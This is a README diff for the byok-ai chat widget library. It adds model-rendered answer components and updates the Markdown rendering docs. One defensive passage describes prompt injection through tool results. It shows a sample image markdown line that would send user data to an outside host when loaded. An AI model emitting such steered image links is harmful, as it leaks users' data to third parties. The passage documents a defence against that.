@@ -50,6 +50,8 @@ assistant.unmount() // when the host removes it
 | `clientTools` | `{}` | AI SDK `tool()` definitions that run in the page. |
 | `workspace` | `false` | Per-conversation files in the browser and sandboxed JavaScript over them (see Workspace). |
 | `images` | `false` | Lets the user attach images to messages, for providers that accept them (see Images). |
+| `answerComponents` | `[]` | Components the model may place in answers, such as charts (see Answer components). |
+| `componentInstructions` | `true` | Tells the model about `answerComponents`, after `systemPrompt`. |
 | `systemPrompt` | a short built-in prompt | System prompt for every answer. |
 | `storageKey` | `byok-ai:conversations` | localStorage key for conversations and the open one. |
 | `connectionKey` | `${storageKey}:connection` | localStorage key for the provider connection. Must differ from `storageKey`. |
@@ -151,11 +153,49 @@ With `images`, and a provider whose preset `acceptsImages`, the user can attach 
 
 Sent images are kept with their conversation in OPFS (`<storageKey>/<conversation id>/images/`), not in localStorage; the message records only each image's id, name and type. Every later turn sends them to the model again. A provider that doesn't accept images gets a note in their place, as does an image that is no longer stored. Deleting a conversation deletes its images. Images attached but not sent are not saved: they are dropped on reload or when another conversation opens.
 
+## Answer components
+
+`answerComponents` lets answers show more than Markdown: charts, cards, whatever your app defines. The model writes one as a fenced block naming it, with its props as one JSON object, and the answer renders your component in its place:
+
+````markdown
+Error rates rose this week:
+
+```component:stat-card
+{"label": "Failed requests", "value": "4.2%", "note": "Up from 1.1%"}
+```
+````
+
+```tsx
+import { AskAI, defineAnswerComponent } from 'byok-ai'
+
+const statCard = defineAnswerComponent<{ label: string; value: string; note?: string }>({
+  name: 'stat-card',
+  label: 'Figure',
+  description: 'One figure that matters, with a short label and an optional note.',
+  schema: { type: 'object', required: ['label', 'value'], properties: { label: { type: 'string' }, value: { type: 'string' }, note: { type: 'string' } } },
+  example: { label: 'Open issues', value: '12' },
+  parse: value => {
+    const props = value as { label?: unknown; value?: unknown; note?: unknown }
+    if (typeof props.label !== 'string' || typeof props.value !== 'string') throw new Error('label and value are text')
+    return { label: props.label, value: props.value, ...(typeof props.note === 'string' ? { note: props.note } : {}) }
+  },
+  render: ({ props }) => <figure><figcaption>{props.label}</figcaption><strong>{props.value}</strong>{props.note && <span>{props.note}</span>}</figure>,
+})
+
+export const Page = () => <AskAI answerComponents={[statCard]} />
+```
+
+An `AnswerComponent` has a `name` (lower-case kebab case), a `label` for people, a `description`, a JSON Schema `schema` and an `example` for the model, `parse`, which checks props and returns them (or throws), and `render`, a React component that receives `props`. The system prompt gets a section that lists them with their schemas and examples (`answerComponentInstructions(components)` returns it, for a prompt you build yourself; `componentInstructions: false` leaves it out). Components render in your React tree, so they see its context.
+
+Props are model output, and tool results can steer it: check them in `parse`, and render them as text, never as HTML or as addresses to load. A component with props that don't parse, or one the app doesn't define, shows a short note in its place. While an answer streams, a component whose block is still open shows as `label…` until it closes.
+
+The fence is the component syntax of [Markora](https://github.com/KevinWang15/markora)'s components extension, which renders the answers (see Custom UI), so documents that embed the same components read the same way.
+
 ## Custom UI
 
 `AskAIProvider` holds state and the assistant-ui runtime and renders no DOM. Inside it, `useAskAI()` returns `title`, `providers`, `mcpServers`, `clientTools` (names), `workspace` (the open conversation's files, when on), `images` (whether images can be attached now), `loadImage(id)`, `open`/`setOpen`, `page`/`setPage` (`'chat' | 'settings' | 'history' | 'tools'`), `connection`, `connect(provider, values)` (returns an error string or `undefined`), `disconnect()`, `conversations`, `activeConversation`, `newConversation()`, `selectConversation(id)`, `deleteConversation(id)` (immediate; confirm first), `busy`, `error`, `storageError` and `runtime`. Send with `runtime.thread.append(text)` and stop with `runtime.thread.cancelRun()`. Changing provider, page or conversation is ignored while `busy`.
 
-Compose the parts you need: `AskAITrigger` and `AskAIPanel` (native button and div props), `AskAISetup`, `AskAIChat`, `AskAIHistory`, `AskAITools`, `AskAIMessageContent`, `AskAIMessageActions`, or `AskAIWidget` for the full default UI. For images in a custom composer or message: `AskAIAddImage` (the attach button; renders nothing while images can't be attached), `AskAIComposerImages` (attached images with remove buttons), `AskAIMessageImages` (a user message's images), and `useAskAIImage()` for your own thumbnail; wrap the composer's input in `ComposerPrimitive.AttachmentDropzone` for dropping. `createBrowserAdapter` is the assistant-ui `ChatModelAdapter` behind the runtime, for hosts that build their own.
+Compose the parts you need: `AskAITrigger` and `AskAIPanel` (native button and div props), `AskAISetup`, `AskAIChat`, `AskAIHistory`, `AskAITools`, `AskAIMessageContent`, `AskAIMessageActions`, or `AskAIWidget` for the full default UI. For images in a custom composer or message: `AskAIAddImage` (the attach button; renders nothing while images can't be attached), `AskAIComposerImages` (attached images with remove buttons), `AskAIMessageImages` (a user message's images), and `useAskAIImage()` for your own thumbnail; wrap the composer's input in `ComposerPrimitive.AttachmentDropzone` for dropping. `createBrowserAdapter` is the assistant-ui `ChatModelAdapter` behind the runtime, for hosts that build their own; it uses `systemPrompt` as given, so add `answerComponentInstructions(components)` to it yourself.
 
 ```tsx
 import { AskAIChat, AskAIHistory, AskAIPanel, AskAIProvider, AskAISetup, AskAITrigger, useAskAI } from 'byok-ai'
@@ -176,9 +216,9 @@ export const Page = () => <AskAIProvider storageKey="my-app:help"><Shell /></Ask
 
 `components` on `AskAIChat`, `AskAIWidget` and `AskAI` replaces parts of the chat: `Text`, `ToolFallback`, `UserMessage`, `AssistantMessage`, `Empty` and `Composer`. Message slots render inside assistant-ui's message scope; use `AskAIMessageContent` in them to keep the `Text` and `ToolFallback` overrides, and `AskAIMessageActions` for copy and regenerate (labels via `copy`, `copied`, `regenerate`). Define slot components at module scope so they don't remount while streaming.
 
-`MarkdownText` is the default `Text`: GitHub-flavored Markdown with raw HTML skipped. Images in an answer are not loaded but shown as `[image: alt]`: tool results can carry text other people wrote, and an answer steered into `![](https://other.site/?d=…)` would send the user's data there the moment it loaded. Pass `components.img` to render them. It reads the current assistant-ui text part and accepts `MarkdownTextProps` (`components`, `remarkPlugins`, `className`, ...).
+`MarkdownText` is the default `Text`. It renders the current assistant-ui text part with [Markora](https://github.com/KevinWang15/markora), read only: GitHub-flavored Markdown and the provider's `answerComponents`, with raw HTML shown as text. Images in an answer are never loaded: each shows as a placeholder with its description, since tool results can carry text other people wrote, and an answer steered into `![](https://other.site/?d=…)` would send the user's data there the moment it loaded. Links are plain anchors; `onOpenLink(href, event)` is called when one is clicked, and `event.preventDefault()` lets you handle it (in-app navigation, a new tab, or nothing). It also takes `components` (in place of the provider's), `className` and `label` (the accessible name, default "Answer"). `Markdown` renders any text the same way outside a chat (`markdown`, and `streaming` while it is still being written), for answers you show elsewhere. Markora's stylesheets come with it, scoped to its element; style the rest by `[data-byok="markdown"]` and Markora's `mdw-` classes (an answer component sits in `.mdw-component`, under a `.mdw-component-header` naming it, which you may hide).
 
-Default components carry `data-byok` attributes for styling (`root`, `trigger`, `dialog`, `panel`, `setup`, `chat`, `messages`, `message` with `data-role`, `composer`, `tool`, `markdown`, `message-actions`, `history`, `tools`, `image` with `data-missing`, `composer-images`, `message-images`, `add-image`, and others). The dialog is portalled to `document.body`, so style it by attribute or class rather than ancestor selectors. `AskAIHistory` takes `title`, `description` and `empty` to replace its copy.
+Default components carry `data-byok` attributes for styling (`root`, `trigger`, `dialog`, `panel`, `setup`, `chat`, `messages`, `message` with `data-role`, `composer`, `tool`, `markdown`, `markdown-pending`, `message-actions`, `history`, `tools`, `image` with `data-missing`, `composer-images`, `message-images`, `add-image`, and others). The dialog is portalled to `document.body`, so style it by attribute or class rather than ancestor selectors. `AskAIHistory` takes `title`, `description` and `empty` to replace its copy.
 
 `usePanelLayout({ storageKey, margin?, minSize? })` gives a floating panel window behavior: move by dragging the header, resize from any edge or corner, arrow keys on the header or a handle (Shift for bigger steps), Escape to cancel a move, and `toggleMaximized()`. Spread `panelProps` on the panel, `headerProps` on its header and `handleProps(edge)` (`'n' | 's' | 'e' | 'w' | 'ne' | 'nw' | 'se' | 'sw'`) on focusable handles, and apply `style`. It sets `--byok-panel-width`/`--byok-panel-height` (px) once resized and `--byok-panel-x`/`--byok-panel-y` (0 to 1 of the free space) once moved; your CSS turns them into placement. It also returns `maximized`, `positioned`, `resizing` and `moving`.
 
